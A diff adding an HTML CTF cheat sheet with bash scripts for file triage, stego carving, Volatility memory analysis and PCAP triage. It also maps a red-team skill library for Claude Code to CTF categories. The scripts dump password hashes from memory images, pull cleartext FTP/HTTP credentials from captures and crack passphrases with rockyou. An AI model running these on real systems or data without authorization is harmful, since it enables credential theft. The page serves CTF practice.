@@ -1,0 +1,1551 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF Techniques Cheatsheet</title>
+<style>
+  :root{
+    --bg:#0e1116; --panel:#161b22; --panel2:#1c2431; --border:#2a3240;
+    --txt:#d7dde5; --muted:#8b97a7; --accent:#4cc2ff; --accent2:#7ee787;
+    --code-bg:#0b0f14; --tag:#243040; --copy:#223; --warn:#ffb86b; --pink:#ff7b9c;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{background:var(--bg);color:var(--txt);font:15px/1.55 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial}
+  a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
+  code,pre{font-family:ui-monospace,"Cascadia Code","Fira Code",Consolas,monospace}
+  code{background:var(--tag);padding:1px 5px;border-radius:4px;font-size:.92em}
+
+  header{position:sticky;top:0;z-index:30;background:linear-gradient(180deg,#111722,#0e1116);
+    border-bottom:1px solid var(--border);padding:12px 20px 0}
+  .htop{display:flex;gap:16px;align-items:center;flex-wrap:wrap;padding-bottom:10px}
+  header h1{font-size:18px;margin:0;letter-spacing:.3px;white-space:nowrap}
+  header h1 span{color:var(--accent)}
+  .sub{color:var(--muted);font-size:12px}
+  #search{flex:1;min-width:200px;max-width:520px;background:var(--code-bg);border:1px solid var(--border);
+    color:var(--txt);padding:9px 12px;border-radius:8px;font-size:14px}
+  #search:focus{outline:none;border-color:var(--accent)}
+
+  .tabs{display:flex;gap:4px;overflow-x:auto;scrollbar-width:thin}
+  .tabs button{background:transparent;border:none;border-bottom:2px solid transparent;color:var(--muted);
+    padding:9px 13px;font-size:13px;cursor:pointer;white-space:nowrap;border-radius:6px 6px 0 0}
+  .tabs button:hover{color:var(--txt);background:var(--panel)}
+  .tabs button.active{color:var(--accent);border-bottom-color:var(--accent);background:var(--panel)}
+
+  main{padding:22px 26px 140px;max-width:1150px;margin:0 auto}
+  .panel{display:none} .panel.show{display:block}
+  .panel h2{font-size:22px;margin:0 0 4px}
+  .panel .lead{color:var(--muted);font-size:13.5px;margin:4px 0 20px;max-width:850px}
+  .panel .lead b{color:var(--accent2)}
+
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px 16px;margin:14px 0}
+  .card h3{margin:0 0 4px;font-size:15.5px}
+  .card .desc{color:var(--muted);font-size:13px;margin:0 0 10px}
+  .tags{margin:0 0 10px}
+  .tags span{display:inline-block;background:var(--tag);color:var(--muted);font-size:11px;padding:2px 8px;
+    border-radius:20px;margin:0 6px 4px 0}
+
+  .snip{position:relative;background:var(--code-bg);border:1px solid var(--border);border-radius:8px;margin:8px 0}
+  .snip .lbl{color:var(--accent2);font-size:11px;padding:6px 12px 0;display:block;font-weight:600}
+  .snip .alt{color:var(--warn)}
+  .snip pre{margin:0;padding:8px 12px 12px;overflow:auto;white-space:pre;font-size:12.5px;line-height:1.5}
+  .snip .copy{position:absolute;top:6px;right:6px;background:var(--copy);color:var(--txt);border:1px solid var(--border);
+    border-radius:6px;font-size:11px;padding:4px 10px;cursor:pointer}
+  .snip .copy:hover{border-color:var(--accent)}
+  .snip .copy.ok{color:var(--accent2);border-color:var(--accent2)}
+
+  .hint{background:var(--panel2);border-left:3px solid var(--accent);padding:8px 12px;border-radius:0 6px 6px 0;
+    font-size:13px;margin:10px 0}
+  .hint b{color:var(--accent)}
+  .hint.w{border-left-color:var(--warn)} .hint.w b{color:var(--warn)}
+
+  table{border-collapse:collapse;width:100%;margin:10px 0;font-size:12.5px}
+  th,td{border:1px solid var(--border);padding:6px 9px;text-align:left;vertical-align:top}
+  th{background:var(--panel2);color:var(--accent2);font-weight:600}
+  td code{background:var(--code-bg)}
+  tr:nth-child(even) td{background:#121722}
+
+  .nores{display:none;color:var(--muted);padding:50px;text-align:center}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  @media(max-width:820px){.grid2{grid-template-columns:1fr}main{padding:16px}}
+  footer{color:var(--muted);font-size:12px;padding:20px 26px;border-top:1px solid var(--border);max-width:1150px;margin:0 auto}
+  kbd{background:var(--tag);border:1px solid var(--border);border-radius:4px;padding:1px 6px;font-size:12px}
+</style>
+</head>
+<body>
+<header>
+  <div class="htop">
+    <h1>🚩 CTF <span>Techniques</span></h1>
+    <input id="search" placeholder="Search all tabs…  (press / )">
+    <span class="sub">Offline · click <b>Copy</b> on any block</span>
+  </div>
+  <div class="tabs" id="tabs"></div>
+</header>
+
+<main id="main">
+<p class="nores" id="nores">No techniques match your search.</p>
+
+<!-- ================================================================ SETUP -->
+<section class="panel" data-tab="Setup">
+  <h2>Setup &amp; Skill Map</h2>
+  <p class="lead">Fresh Kali? Run <b>install.sh</b> in this folder to get every tool below. This tab also maps the installed <b>Claude-Red</b> skill to your CTF categories so you know what it covers and what it doesn't.</p>
+
+  <div class="card">
+    <h3>One-shot Kali setup</h3>
+    <p class="desc">Installs apt packages + pip/pipx + git tools, grouped by category. <b>Wordlists &amp; crackers (rockyou unzipped, SecLists, hashcat, john, hydra, fcrackzip, pdfcrack) install on every run</b> regardless of category, so the auto scripts' default paths always resolve. Verify afterwards with <code>automate/auto_all.sh --check</code>.</p>
+    <div class="snip"><span class="lbl">run the installer</span><button class="copy">Copy</button><pre>chmod +x install.sh
+./install.sh                 # everything
+./install.sh --category web  # just one category
+./install.sh --core          # apt packages only (fast)
+./install.sh --list          # show categories</pre></div>
+    <div class="snip"><span class="lbl alt">post-install shell setup</span><button class="copy">Copy</button><pre>echo 'export PATH="$HOME/.local/bin:$HOME/tools:$PATH"' >> ~/.zshrc
+echo "alias stegsolve='java -jar ~/tools/stegsolve.jar'" >> ~/.zshrc
+echo "alias rsactftool='python3 ~/tools/RsaCtfTool/RsaCtfTool.py'" >> ~/.zshrc
+# let non-root sniff:
+sudo dpkg-reconfigure wireshark-common && sudo usermod -aG wireshark $USER</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Where to run this — Windows vs Kali/WSL</h3>
+    <p class="desc">These scripts are bash and assume Linux tooling (volatility3, sleuthkit, zsteg, stegseek, tshark, pwntools…). Your box is Windows, so pick a lane:</p>
+    <table>
+      <tr><th>Run</th><th>Where</th><th>Why</th></tr>
+      <tr><td>the whole <code>automate/</code> kit + <code>install.sh</code></td><td><b>Kali or WSL2 (Ubuntu/Kali)</b></td><td>the Linux CTF tools only exist/behave there; <code>install.sh</code> is apt-based</td></tr>
+      <tr><td>Hayabusa &amp; DeepBlueCLI</td><td><b>native Windows</b> (PowerShell) or Linux binary</td><td>both ship Windows builds; Hayabusa has a Linux binary too (install.sh fetches it)</td></tr>
+      <tr><td>quick edits / reading the cheat sheet</td><td>anywhere (Git Bash opens the HTML)</td><td>no tools needed</td></tr>
+    </table>
+    <div class="snip"><span class="lbl">recommended: WSL2 once, then work inside it</span><button class="copy">Copy</button><pre>wsl --install -d kali-linux          # (PowerShell, admin) or Ubuntu
+# inside WSL — your D: drive is at /mnt/d:
+cd /mnt/d/03_CTF && ./install.sh && ./automate/auto_all.sh --check</pre></div>
+    <div class="hint w"><b>Gotchas:</b> paths like <code>/d/03_CTF</code> (Git Bash) become <code>/mnt/d/03_CTF</code> (WSL). Run <code>dos2unix automate/*</code> if you ever edit the scripts in a Windows editor (CRLF line endings break bash).</div>
+  </div>
+
+  <div class="card">
+    <h3>Claude-Red skill ↔ your CTF categories</h3>
+    <p class="desc">Installed at <code>~/.claude/skills/claude-red/</code> (79 skills, 23 categories). It's a <b>red-team / pentest</b> library, so it overlaps your live-target categories but has gaps for puzzle/analysis categories — those are where this cheat sheet does the work.</p>
+    <table>
+      <tr><th>Your CTF category</th><th>Claude-Red coverage</th><th>Match</th></tr>
+      <tr><td>Web</td><td><code>web/*</code> — xss, ssti, xxe, ssrf, idor, file-upload, deserialization, graphql, race-condition, request-smuggling, waf-bypass, open-redirect, param-pollution; <code>auth/*</code> jwt+oauth; <code>api/*</code></td><td>✅ strong</td></tr>
+      <tr><td>Pwn</td><td><code>exploit-dev/*</code> — basic-exploitation, exploit-development, crash-analysis, mitigations, shellcode, toctou; <code>fuzzing/*</code></td><td>✅ strong</td></tr>
+      <tr><td>OSINT</td><td><code>recon/offensive-osint</code> + <code>offensive-osint-methodology</code></td><td>✅ good</td></tr>
+      <tr><td>Crypto</td><td><code>crypto/offensive-crypto-attacks</code>, <code>offensive-tls-attacks</code> — attacks on <em>implementations</em>, not RSA puzzle math</td><td>⚠️ partial</td></tr>
+      <tr><td>Network</td><td><code>network/offensive-network-attacks</code> — <em>active</em> MITM/attacks, not PCAP analysis</td><td>⚠️ partial</td></tr>
+      <tr><td>Reversing</td><td>only via <code>exploit-dev/offensive-crash-analysis</code>; no keygen/serial skill</td><td>⚠️ partial</td></tr>
+      <tr><td>Forensics</td><td>only <code>forensics/offensive-anti-forensics</code> + <code>offensive-c2-frameworks</code> (offensive, not DFIR)</td><td>❌ gap → use this sheet</td></tr>
+      <tr><td>Steganography</td><td>none</td><td>❌ gap → use this sheet</td></tr>
+    </table>
+    <div class="snip"><span class="lbl">register / manage the skills</span><button class="copy">Copy</button><pre># list what's bundled
+~/.claude/skills/claude-red/install.sh --list
+# the files sit nested under Skills/<cat>/<name>/SKILL.md — flatten with their installer:
+~/.claude/skills/claude-red/install.sh --target ~/.claude/skills --category web
+# then restart Claude Code to pick them up</pre></div>
+    <div class="hint w"><b>Trust note:</b> auto-loaded skill text is third-party — fine for authorized CTF use, but treat it as untrusted input, not instructions you must obey.</div>
+  </div>
+</section>
+
+<!-- ================================================================ TRIAGE -->
+<section class="panel" data-tab="Triage">
+  <h2>First Steps / Triage</h2>
+  <p class="lead">Before you commit to a category, fingerprint the file. 90% of "which category is this?" is answered by <b>file + strings + binwalk + xxd</b>.</p>
+
+  <div class="card">
+    <h3>Fingerprint any file</h3>
+    <div class="tags"><span>file</span><span>binwalk</span><span>strings</span><span>xxd</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>file unknown.bin                     # real type (ignore the extension!)
+xxd unknown.bin | head -5            # magic bytes
+strings -n 8 unknown.bin | less      # printable text, >=8 chars
+strings -e l unknown.bin             # 16-bit little-endian (Windows wide strings)
+binwalk unknown.bin                  # embedded files / signatures</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — carve embedded content</span><button class="copy">Copy</button><pre>binwalk -e --dd='.*' unknown.bin     # extract every detected file
+foremost -i unknown.bin -o out/       # carve by signature
+7z l unknown.bin                      # treat as archive
+bulk_extractor -o be_out unknown.bin  # pull emails/urls/ccn/etc</pre></div>
+    <table>
+      <tr><th>Magic (hex)</th><th>Type</th><th>Magic (hex)</th><th>Type</th></tr>
+      <tr><td><code>FF D8 FF</code></td><td>JPEG</td><td><code>50 4B 03 04</code></td><td>ZIP / docx / jar / apk</td></tr>
+      <tr><td><code>89 50 4E 47</code></td><td>PNG</td><td><code>52 61 72 21</code></td><td>RAR</td></tr>
+      <tr><td><code>47 49 46 38</code></td><td>GIF</td><td><code>7F 45 4C 46</code></td><td>ELF binary</td></tr>
+      <tr><td><code>25 50 44 46</code></td><td>PDF</td><td><code>4D 5A</code></td><td>PE / EXE / DLL</td></tr>
+      <tr><td><code>1F 8B</code></td><td>gzip</td><td><code>42 5A 68</code></td><td>bzip2</td></tr>
+      <tr><td><code>52 49 46 46</code></td><td>WAV/AVI</td><td><code>66 74 79 70</code></td><td>MP4/HEIC (@off 4)</td></tr>
+    </table>
+    <div class="hint"><b>Fix a broken header:</b> if <code>file</code> says "data" but you expected a PNG, patch the first bytes in a hex editor (<code>ghex</code>/<code>xxd -r</code>) to the correct magic.</div>
+  </div>
+
+  <div class="card">
+    <h3>Grep for the flag anywhere</h3>
+    <div class="tags"><span>grep</span><span>regex</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>grep -raoE '[A-Za-z0-9_]{2,}\{[^}]{1,80}\}' .       # any name{...}
+grep -raiE 'flag|ctf\{|csg\{|cscv\{|secret|password' . | head
+rg -a --no-ignore 'flag\{' .                          # ripgrep, faster</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — decode-then-grep (base64 flags)</span><button class="copy">Copy</button><pre>strings f | grep -oE '[A-Za-z0-9+/=]{16,}' | while read s; do echo "$s"|base64 -d 2>/dev/null; done | grep -ai flag</pre></div>
+  </div>
+</section>
+
+<!-- ================================================================ AUTOMATE -->
+<section class="panel" data-tab="Automate_Check">
+  <h2>Automate_Check — recon that runs itself</h2>
+  <p class="lead">Point these at a fresh challenge and they check <b>every path for you</b>, then sweep all output for the flag. They live as real files in <code>./automate/</code> (already created) — or copy from here. Missing tools are skipped, never fatal. Run <b>install.sh</b> first so the tools exist.</p>
+
+  <div class="card">
+    <h3>Setup &amp; run order</h3>
+    <div class="tags"><span>workflow</span><span>interactive</span></div>
+    <div class="snip"><span class="lbl">make runnable (once)</span><button class="copy">Copy</button><pre>chmod +x automate/*.sh automate/*.py
+export PATH="$PWD/automate:$PATH"</pre></div>
+    <div class="snip"><span class="lbl">EASIEST: run the master, then TYPE the target</span><button class="copy">Copy</button><pre>auto_all.sh
+# [?] target (file.pcap / dump.mem / http://host): _          &lt;- you type it here
+# ...or pass it directly:
+auto_all.sh capture.pcap
+auto_all.sh dump.mem
+auto_all.sh "http://10.10.10.5/"</pre></div>
+    <div class="snip"><span class="lbl">every script also prompts when run with no argument</span><button class="copy">Copy</button><pre>auto_triage.sh                 # -> [?] file:
+auto_forensic.sh               # -> [?] file:
+auto_pcap.sh                   # -> [?] pcap:
+auto_mem.sh                    # -> [?] memory dump:
+auto_hayabusa.sh               # -> [?] evtx file or dir:  (Sigma timeline, PRIMARY)
+auto_winlog.py                 # -> [?] evtx / xml dump:   (DeepBlueCLI-style, no-binary fallback)
+auto_dirsweep.sh               # -> [?] directory:         (mixed folder: PDFs/writeups/bundles)
+auto_rev.sh                    # -> [?] binary:            (static reversing recon)
+auto_pwn.sh                    # -> [?] binary:            (pwn triage + pwntools skeleton)
+auto_web.py                    # -> [?] url:               (classifies the vuln area)
+auto_crypto.py                 # -> [?] text (or: --rsa n e c)   (classifies the area)</pre></div>
+    <div class="snip"><span class="lbl">check your toolbox + scope the flag format</span><button class="copy">Copy</button><pre>auto_all.sh --check                 # dependency doctor: green=present, red!=missing
+auto_all.sh capture.pcap CSG        # 2nd arg = flag prefix -> sweeps only CSG{...}
+FLAG_PREFIX=CSG auto_forensic.sh x.png   # or via env (propagates to the python tools too)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>config.sh — one place to tune everything</h3>
+    <p class="desc">All scripts source <code>automate/config.sh</code>. Change a value once and every tool follows. Each has a sane default and is overridable inline or via env.</p>
+    <div class="tags"><span>config</span><span>timeouts</span><span>wordlists</span></div>
+    <div class="snip"><span class="lbl">automate/config.sh (key knobs)</span><button class="copy">Copy</button><pre>FLAG_PREFIX=""                      # e.g. CSG -> flag sweeps match CSG{...} only
+WORDLIST=/usr/share/wordlists/rockyou.txt   # used by stegseek / crackers
+SECLISTS=/usr/share/seclists
+HAYABUSA=""                         # hayabusa binary (auto-detected if empty)
+VOL=""                              # volatility3 cmd (auto-detected if empty)
+TOOL_TIMEOUT=120                    # seconds per external tool (0 = unlimited)
+HEAD_LINES=80                       # console preview; FULL output still saved to *.log
+FAIL_THRESHOLD=10  SPRAY_THRESHOLD=5  ADMIN_THRESHOLD=5   # auto_winlog tuning</pre></div>
+    <div class="hint"><b>What the refactor gives you:</b> every external tool now runs under <code>timeout</code> (one hang won't stall the run), full output is tee'd to per-tool <code>*.log</code> files (nothing truncated away), and the flag sweeps honor your prefix so you stop chasing decoy <code>name{...}</code> strings.</div>
+  </div>
+
+  <div class="card">
+    <h3>report.md — one aggregated report per target</h3>
+    <p class="desc">Every <code>auto_all.sh</code> run now writes <code>report_&lt;target>/report.md</code>: run metadata, a captured section per checker, and a <b>ranked flag-candidates table</b> (hits × candidate, prefix matches first). The ranked list also echoes to your console at the end.</p>
+    <div class="tags"><span>report</span><span>flag-candidates</span></div>
+    <div class="snip"><span class="lbl">example</span><button class="copy">Copy</button><pre>auto_all.sh chall.txt CSG
+# -> report_chall.txt/report.md  +  report_chall.txt/auto_crypto.log</pre></div>
+    <div class="snip"><span class="lbl">report.md (shape)</span><button class="copy">Copy</button><pre># CTF auto-check report
+- target: `chall.txt`
+- flag filter: `CSG` (regex `CSG\{[^}]{1,120}\}`)
+
+## auto_crypto
+``` (key lines captured from the run) ```
+
+## Flag candidates (ranked)
+| hits | candidate | note |
+|---|---|---|
+| 14 | `CSG{the_actual_flag}` | matches prefix ✓ |</pre></div>
+    <div class="hint"><b>How ranking works:</b> flags are swept from every checker log + the target itself, deduped, counted, and (when a prefix is set) prefix matches float to the top. Decoys like <code>FOO{...}</code> are filtered out by the prefix.</div>
+  </div>
+
+  <div class="card">
+    <h3>auto_all.sh — master dispatcher (keyboard input)</h3>
+    <p class="desc">Type any target at the prompt (or pass as arg). Detects URL vs pcap vs memory dump vs media/binary/archive vs <b>folder</b>, <b>runs</b> the right checker (capturing its output), then builds the aggregated <code>report.md</code>. A <b>directory</b> routes to Hayabusa only if it contains <code>.evtx</code>, else to <code>auto_dirsweep.sh</code>. Falls back to <code>file</code>-content sniffing when the extension lies.</p>
+    <div class="snip"><span class="lbl">example: sweep a folder of writeups/answer-keys</span><button class="copy">Copy</button><pre>auto_all.sh "Answer Keys_2024" CSG_FLAG
+# dir has no .evtx -> auto_dirsweep.sh -> pdftotext each PDF -> pull CSG_FLAG{...}
+# -> report_Answer_Keys_2024/report.md  (ranked candidate table)</pre></div>
+    <div class="tags"><span>dispatch</span><span>interactive</span></div>
+    <div class="snip"><span class="lbl">automate/auto_all.sh</span><button class="copy">Copy</button><pre>#!/usr/bin/env bash
+# auto_all.sh [target] — type the target at the prompt, or pass it as an arg.
+set -u
+HERE="$(cd "$(dirname "$(readlink -f "$0")")" &amp;&amp; pwd)"
+if [ -n "${1:-}" ]; then T="$1"; else
+  read -rp "[?] target (file.pcap / dump.mem / http://host): " T
+fi
+[ -n "$T" ] || { echo "nothing given"; exit 1; }
+
+if printf '%s' "$T" | grep -qiE '^https?://'; then
+  echo "[*] URL -> auto_web.py"; exec "$HERE/auto_web.py" "$T"
+fi
+[ -d "$T" ] &amp;&amp; exec "$HERE/auto_hayabusa.sh" "$T"   # directory of evtx -> Hayabusa
+[ -f "$T" ] || { echo "[-] not a URL and not a file: $T"; exit 1; }
+ext="${T##*.}"; ext="${ext,,}"; desc="$(file -b "$T")"; echo "[*] file: $desc"
+
+case "$ext" in
+  pcap|pcapng|cap)                      exec "$HERE/auto_pcap.sh" "$T";;
+  mem|raw|vmem|dmp|lime|vmss|vmsn|dump|core) exec "$HERE/auto_mem.sh" "$T";;
+  evtx)                                 exec "$HERE/auto_hayabusa.sh" "$T";;  # or auto_winlog.py (no binary)
+  png|jpg|jpeg|bmp|gif|wav|mp3|flac|ogg|svg|pdf|docx|doc|xlsx|xls|pptx|ppt)
+                                        exec "$HERE/auto_forensic.sh" "$T";;
+  txt|enc|b64|hex|cipher)               exec "$HERE/auto_crypto.py" "$(cat "$T")";;
+  zip|rar|7z|tar|gz) echo "[*] archive -> 7z l '$T'; zip2john/bkcrack if locked"; exit 0;;
+esac
+case "$desc" in                          # extension unknown -> sniff content
+  *pcap*|*"capture file"*)              exec "$HERE/auto_pcap.sh" "$T";;
+  *image*|*PNG*|*JPEG*|*bitmap*|*GIF*)  exec "$HERE/auto_forensic.sh" "$T";;
+  *ELF*|*PE32*|*executable*|*Mach-O*)   echo "[*] binary -> rev/pwn"; command -v checksec >/dev/null &amp;&amp; checksec --file="$T"; exit 0;;
+  *ASCII*|*text*|*Unicode*)             exec "$HERE/auto_crypto.py" "$(cat "$T")";;
+  *data*) echo "[?] raw data — guessing memory"; exec "$HERE/auto_mem.sh" "$T";;
+  *) echo "[?] unknown — triage"; exec "$HERE/auto_triage.sh" "$T";;
+esac</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>auto_mem.sh — memory dump (Volatility 3)</h3>
+    <p class="desc">For <code>dump.mem</code>/<code>.raw</code>/<code>.vmem</code>. Auto-detects Windows vs Linux, runs the recon→extract battery (pstree, cmdline, netscan, hashdump, malfind, cmdscan, filescan / linux.bash), then strings-sweeps for the flag.</p>
+    <div class="tags"><span>volatility3</span><span>memory</span></div>
+    <div class="snip"><span class="lbl">automate/auto_mem.sh</span><button class="copy">Copy</button><pre>#!/usr/bin/env bash
+# auto_mem.sh [dump.mem] — Volatility 3 recon + flag sweep (prompts if no arg).
+set -u
+if [ -n "${1:-}" ]; then SRC="$1"; else read -rp "[?] memory dump: " SRC; fi
+[ -n "$SRC" ] || { echo "no dump given"; exit 1; }
+F="$(readlink -f "$SRC")"; OUT="mem_$(basename "$F")_out"; mkdir -p "$OUT"; cd "$OUT" || exit 1
+VOL="$(command -v vol || command -v vol.py || command -v volatility3 || true)"
+[ -z "$VOL" ] &amp;&amp; { echo "[-] volatility3 missing -> pipx install volatility3"; exit 1; }
+run(){ printf '\n\033[1;36m=== %s ===\033[0m\n' "$*"; "$@" 2>/dev/null | head -60; }
+
+OS=windows
+"$VOL" -f "$F" windows.info >/dev/null 2>&amp;1 || { "$VOL" -f "$F" banners.Banners >/dev/null 2>&amp;1 &amp;&amp; OS=linux; }
+echo "[*] detected OS = $OS"
+if [ "$OS" = windows ]; then
+  for p in windows.info windows.pstree windows.cmdline windows.netscan \
+           windows.hashdump windows.malfind windows.cmdscan windows.consoles; do
+    run "$VOL" -f "$F" "$p"
+  done
+  "$VOL" -f "$F" windows.filescan 2>/dev/null > filescan.txt
+  grep -iE 'flag|secret|desktop|\.txt|\.zip|\.docx?' filescan.txt | head -40
+  echo "[*] dump a file: $VOL -f '$F' windows.dumpfiles --virtaddr 0xADDR"
+else
+  for p in banners.Banners linux.pslist linux.pstree linux.bash linux.lsof; do run "$VOL" -f "$F" "$p"; done
+fi
+printf '\n\033[1;32m=== strings flag sweep ===\033[0m\n'
+strings -n 8 "$F" | grep -aoE '[A-Za-z0-9_]{2,}\{[^}]{1,120}\}' | sort -u | head</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>auto_triage.sh — fingerprint &amp; route</h3>
+    <p class="desc">Identifies the file, greps for the flag (raw + base64-decoded), then prints the exact next command for its type.</p>
+    <div class="tags"><span>triage</span><span>dispatch</span></div>
+    <div class="snip"><span class="lbl">automate/auto_triage.sh</span><button class="copy">Copy</button><pre>#!/usr/bin/env bash
+# auto_triage.sh &lt;file>  —  fingerprint anything and route to the right deep-check.
+set -u
+if [ -n "${1:-}" ]; then F="$1"; else read -rp "[?] file: " F; fi
+[ -n "$F" ] || { echo "no file given"; exit 1; }
+have(){ command -v "$1" >/dev/null 2>&amp;1; }
+line(){ printf '\n\033[1;36m=== %s ===\033[0m\n' "$*"; }
+
+line "file type";   file "$F"
+line "size";        printf '%s bytes\n' "$(wc -c &lt; "$F")"
+line "magic (hex)"; xxd "$F" | head -3
+have ent &amp;&amp; { line "entropy (hi≈encrypted)"; ent "$F" | grep -i entropy; }
+
+line "FLAG grep (raw)"
+grep -aoE '[A-Za-z0-9_]{2,}\{[^}]{1,120}\}' "$F" | sort -u
+line "FLAG grep (base64-decoded chunks)"
+grep -aoE '[A-Za-z0-9+/=]{16,}' "$F" | while read -r s; do echo "$s" | base64 -d 2>/dev/null; done \
+  | grep -aoE '[A-Za-z0-9_]{2,}\{[^}]{1,120}\}' | sort -u
+
+line "strings hits"
+{ strings -n 6 "$F"; strings -e l "$F"; } | grep -aiE 'flag|ctf|secret|passw|key' | head
+line "embedded files"; have binwalk &amp;&amp; binwalk "$F"
+
+line "ROUTE"
+case "$(file -b "$F")" in
+  *PNG*|*JPEG*|*image*|*bitmap*|*GIF*)   echo "-> ./auto_forensic.sh '$F'   (media/stego)";;
+  *filesystem*|*"disk image"*|*"boot sector"*) echo "-> mmls '$F'; fls -r -o &lt;off> '$F'; autopsy";;
+  *pcap*|*"capture file"*|*tcpdump*)     echo "-> ./auto_pcap.sh '$F'";;
+  *ELF*|*PE32*|*executable*|*Mach-O*)    echo "-> checksec --file='$F'; ltrace './$F'; ghidra";;
+  *Zip*|*RAR*|*7-zip*|*archive*|*gzip*)  echo "-> 7z l '$F'   (locked? zip2john/bkcrack)";;
+  *PDF*)                                 echo "-> pdfid '$F'; pdftotext -layout '$F' -; olevba";;
+  *ASCII*|*text*|*Unicode*)              echo "-> ./auto_crypto.py \"\$(cat '$F')\"";;
+  *)                                     echo "-> binwalk -e '$F'; foremost -i '$F' -o carved/";;
+esac</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>auto_forensic.sh — every extractor at once</h3>
+    <p class="desc">Runs exiftool, binwalk -e, foremost, bulk_extractor, zsteg, steghide (blank + rockyou via stegseek), outguess, pngcheck, spectrogram, PDF/Office parsers — then flag-sweeps the whole output dir.</p>
+    <div class="tags"><span>stego</span><span>carving</span><span>media</span></div>
+    <div class="snip"><span class="lbl">automate/auto_forensic.sh</span><button class="copy">Copy</button><pre>#!/usr/bin/env bash
+# auto_forensic.sh &lt;file>  —  run EVERY stego/forensic extractor, then flag-sweep.
+set -u
+if [ -n "${1:-}" ]; then SRC="$1"; else read -rp "[?] file: " SRC; fi
+F="$(readlink -f "$SRC")"
+OUT="forensic_$(basename "$F")_out"; mkdir -p "$OUT"; cd "$OUT" || exit 1
+have(){ command -v "$1" >/dev/null 2>&amp;1; }
+run(){ printf '\n\033[1;36m=== %s ===\033[0m\n' "$*"; "$@" 2>&amp;1 | head -80; }
+ext="${F##*.}"; ext="${ext,,}"
+
+run file "$F"
+have exiftool &amp;&amp; run exiftool "$F"
+{ strings -n 6 "$F"; strings -e l "$F"; strings -e b "$F"; } > strings.txt
+
+have binwalk  &amp;&amp; run binwalk "$F"
+have binwalk  &amp;&amp; binwalk -e --dd='.*' "$F" -C . >/dev/null 2>&amp;1
+have foremost &amp;&amp; foremost -i "$F" -o foremost_out >/dev/null 2>&amp;1
+have bulk_extractor &amp;&amp; bulk_extractor -o be_out "$F" >/dev/null 2>&amp;1
+
+case "$ext" in png|bmp) have zsteg &amp;&amp; run zsteg -a "$F";; esac
+case "$ext" in
+  jpg|jpeg|bmp|wav|au)
+    have steghide &amp;&amp; { steghide extract -sf "$F" -p "" -xf steg_blank.out 2>/dev/null &amp;&amp; echo "[+] steghide blank-pass hit!"; }
+    have stegseek &amp;&amp; run stegseek "$F" /usr/share/wordlists/rockyou.txt steg_crack.out ;;
+esac
+have outguess &amp;&amp; outguess -r "$F" outguess.out 2>/dev/null
+have pngcheck &amp;&amp; run pngcheck -v "$F"
+case "$ext" in wav|mp3|flac|ogg) have sox &amp;&amp; sox "$F" -n spectrogram -o spectrogram.png 2>/dev/null &amp;&amp; echo "[+] spectrogram.png";; esac
+case "$ext" in
+  pdf) have pdfid &amp;&amp; run pdfid "$F"; have pdfimages &amp;&amp; pdfimages -all "$F" img >/dev/null 2>&amp;1;;
+  doc*|xls*|ppt*) have olevba &amp;&amp; run olevba "$F";;
+esac
+
+printf '\n\033[1;32m=== FLAG SWEEP ===\033[0m\n'
+grep -raoE '[A-Za-z0-9_]{2,}\{[^}]{1,120}\}' . | sort -u</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>auto_pcap.sh — full network triage</h3>
+    <p class="desc">Protocol hierarchy, conversations, exported HTTP/SMB/TFTP/email objects, cleartext creds, DNS names, USB-HID keystrokes, reassembled streams, carved files — all swept for the flag.</p>
+    <div class="tags"><span>pcap</span><span>tshark</span></div>
+    <div class="snip"><span class="lbl">automate/auto_pcap.sh</span><button class="copy">Copy</button><pre>#!/usr/bin/env bash
+# auto_pcap.sh &lt;capture.pcap>  —  full PCAP triage + flag sweep.
+set -u
+if [ -n "${1:-}" ]; then SRC="$1"; else read -rp "[?] pcap: " SRC; fi
+F="$(readlink -f "$SRC")"
+OUT="pcap_$(basename "$F")_out"; mkdir -p "$OUT"; cd "$OUT" || exit 1
+run(){ printf '\n\033[1;36m=== %s ===\033[0m\n' "$*"; "$@" 2>&amp;1 | head -60; }
+
+command -v capinfos >/dev/null &amp;&amp; run capinfos "$F"
+run tshark -r "$F" -q -z io,phs
+run tshark -r "$F" -q -z conv,tcp
+
+for proto in http smb tftp imf; do
+  mkdir -p "obj_$proto"; tshark -r "$F" --export-objects "$proto,obj_$proto" >/dev/null 2>&amp;1
+done
+run tshark -r "$F" -Y 'http.request' -T fields -e http.host -e http.request.uri
+tshark -r "$F" -Y 'dns' -T fields -e dns.qry.name 2>/dev/null | sort -u > dns_names.txt
+
+echo "[*] cleartext creds (FTP/HTTP-basic):"
+tshark -r "$F" -Y 'ftp.request.command=="USER" || ftp.request.command=="PASS"' -T fields -e ftp.request.arg 2>/dev/null
+tshark -r "$F" -Y 'http.authorization' -T fields -e http.authorization 2>/dev/null
+
+echo "[*] USB HID -> usb_hid.txt (feed to ctf-usb-keyboard-parser):"
+tshark -r "$F" -Y 'usb.capdata' -T fields -e usb.capdata 2>/dev/null | sed 's/://g' > usb_hid.txt
+
+command -v tcpflow  >/dev/null &amp;&amp; { mkdir -p streams; tcpflow -r "$F" -o streams >/dev/null 2>&amp;1; }
+command -v foremost >/dev/null &amp;&amp; foremost -i "$F" -o carved >/dev/null 2>&amp;1
+
+printf '\n\033[1;32m=== FLAG SWEEP ===\033[0m\n'
+grep -raoE '[A-Za-z0-9_]{2,}\{[^}]{1,120}\}' . | sort -u</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>auto_dirsweep.sh — sweep a mixed folder for flags</h3>
